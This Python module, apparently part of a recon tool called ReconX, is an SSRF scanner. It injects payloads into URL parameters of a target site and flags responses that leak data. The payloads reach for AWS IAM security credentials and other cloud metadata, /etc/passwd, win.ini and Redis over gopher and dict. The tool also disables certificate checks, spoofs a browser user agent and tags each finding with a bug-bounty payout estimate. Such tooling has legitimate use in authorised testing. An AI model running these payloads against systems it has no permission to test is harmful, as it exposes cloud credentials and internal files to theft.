# modules/vuln/web/ssrf_scanner.py
"""ReconX - SSRF Scanner (Server-Side Request Forgery)."""

import ssl
import logging
import urllib.request
import urllib.error
import urllib.parse
from datetime import datetime

logger = logging.getLogger("ReconX.ssrf")


# Common SSRF-prone parameter names
SSRF_PARAMS = [
    "url", "uri", "link", "src", "source", "target", "dest", "destination",
    "redirect", "redirect_uri", "redirect_url", "return", "return_url",
    "next", "continue", "callback", "webhook", "feed", "host", "site",
    "reference", "ref", "path", "file", "load", "page", "image", "img",
    "domain", "proxy", "fetch", "resource", "endpoint", "api",
]


# SSRF test payloads (for detection — actual internal targets)
SSRF_PAYLOADS = [
    # (payload, detection_keyword, description)
    ("http://127.0.0.1", None, "Loopback IPv4"),
    ("http://localhost", None, "Localhost hostname"),
    ("http://[::1]", None, "Loopback IPv6"),
    ("http://127.0.0.1:80", None, "Local port 80"),
    ("http://127.0.0.1:8080", None, "Local port 8080"),
    ("http://169.254.169.254/latest/meta-data/", "ami-", "AWS EC2 metadata"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AccessKeyId", "AWS IAM creds"),
    ("http://metadata.google.internal/computeMetadata/v1/", "project", "GCP metadata"),
    ("http://100.100.100.200/latest/meta-data/", "instance-id", "Alibaba Cloud metadata"),
    ("file:///etc/passwd", "root:x:", "/etc/passwd leak"),
    ("file:///c:/windows/win.ini", "[fonts]", "Windows win.ini leak"),
    ("dict://127.0.0.1:6379/INFO", "redis_version", "Redis via dict"),
    ("gopher://127.0.0.1:6379/_INFO", "redis_version", "Redis via gopher"),
]


def _make_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _fetch(url, timeout=10):
    """Fetch URL, return (status, body, elapsed)."""
    import time
    start = time.time()

    try:
        req = urllib.request.Request(url, headers={
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0",
        })
        with urllib.request.urlopen(req, timeout=timeout, context=_make_ctx()) as r:
            body = r.read(100000).decode("utf-8", errors="ignore")
            return r.status, body, time.time() - start
    except urllib.error.HTTPError as e:
        try:
            body = e.read(50000).decode("utf-8", errors="ignore")
        except Exception:
            body = ""
        return e.code, body, time.time() - start
    except Exception as e:
        return None, str(e), time.time() - start


def _build_url(base_url, param, payload):
    """Replace param value with payload."""
    parsed = urllib.parse.urlparse(base_url)
    qs = urllib.parse.parse_qs(parsed.query)
    qs[param] = [payload]
    new_query = urllib.parse.urlencode(qs, doseq=True)
    return urllib.parse.urlunparse(parsed._replace(query=new_query))


def test_ssrf(url, param, payload, detection_kw, timeout=10):
    """Test single SSRF payload."""
    test_url = _build_url(url, param, payload)

    status, body, elapsed = _fetch(test_url, timeout=timeout)

    if status is None:
        return None

    # Detection
    if detection_kw and body:
        if detection_kw in body:
            return {
                "id": f"ssrf_{param}",
                "title": f"SSRF in '{param}' — {detection_kw} detected",
                "parameter": param,
                "payload": payload,
                "severity": "critical",
                "bug_class": "ssrf",
                "payout_potential": "$1000-$10000+",
                "confidence": 0.95,
                "url": test_url,
                "evidence": f"Payload '{payload}' returned '{detection_kw}'",
                "source": "custom_ssrf",
            }

    # Heuristic: status 200 with suspiciously fast response for file://
    if status == 200 and payload.startswith("file://") and body and len(body) > 0:
        # Check for known file content
        if "root:" in body or "bin/bash" in body:
            return {
                "id": f"ssrf_file_{param}",
                "title": f"SSRF file:// read via '{param}'",
                "parameter": param,
                "payload": payload,
                "severity": "critical",
                "bug_class": "ssrf_file_read",
                "payout_potential": "$1000-$10000+",
                "confidence": 0.90,
                "url": test_url,
                "evidence": "File content appeared in response",
                "source": "custom_ssrf",
            }

    return None


def scan(target, params=None, timeout=10, verbose=False):
    """Full SSRF scan."""
    result = {
        "timestamp": datetime.now().isoformat(),
        "target": target,
        "findings": [],
        "tested_params": 0,
        "tested_payloads": 0,
        "error": None,
    }

    # Get params
    parsed = urllib.parse.urlparse(target)
    if params is None:
        existing = list(urllib.parse.parse_qs(parsed.query).keys())
        params = existing if existing else SSRF_PARAMS[:10]

    if not params:
        result["error"] = "no parameters to test"
        return result

    result["tested_params"] = len(params)

    for param in params:
        for payload, detection_kw, desc in SSRF_PAYLOADS:
            result["tested_payloads"] += 1

            finding = test_ssrf(target, param, payload, detection_kw, timeout=timeout)

            if finding:
                finding["description"] = desc
                result["findings"].append(finding)
                if verbose:
                    print(f"    🔴 {desc} via '{param}'")
                break  # One finding per param

    return result


def print_report(result):
    print("\n" + "=" * 70)
    print("  SSRF Scanner — ReconX")
    print("=" * 70)

    print(f"\n[*] Target:         {result.get('target')}")
    print(f"[*] Tested params:  {result.get('tested_params', 0)}")
    print(f"[*] Tested payloads: {result.get('tested_payloads', 0)}")
    print(f"[*] Findings:       {len(result.get('findings', []))}")

    if result.get("error"):
        print(f"\n[!] {result['error']}")
        return

    if result.get("findings"):
        for f in result["findings"]:
            print(f"\n  🔴 [CRITICAL] {f['title']}")
            print(f"       Parameter: {f['parameter']}")
            print(f"       Payload:   {f['payload']}")
            print(f"       Evidence:  {f['evidence']}")
            print(f"       Payout:    {f.get('payout_potential', '?')}")
            print(f"       Source:    {f.get('source', '?')}")
    else:
        print(f"\n[OK] No SSRF found")

    print("\n" + "=" * 70 + "\n")


if __name__ == "__main__":
    import sys
    logging.basicConfig(level=logging.INFO)

    if len(sys.argv) < 2:
        print("Usage: python -m modules.vuln.web.ssrf_scanner <url-with-params>")
        print("Example: python -m modules.vuln.web.ssrf_scanner 'https://example.com/fetch?url=test'")
        sys.exit(1)

    url = sys.argv[1]
    print(f"\n[*] SSRF scan: {url}")

    result = scan(url, verbose=True)
    print_report(result)
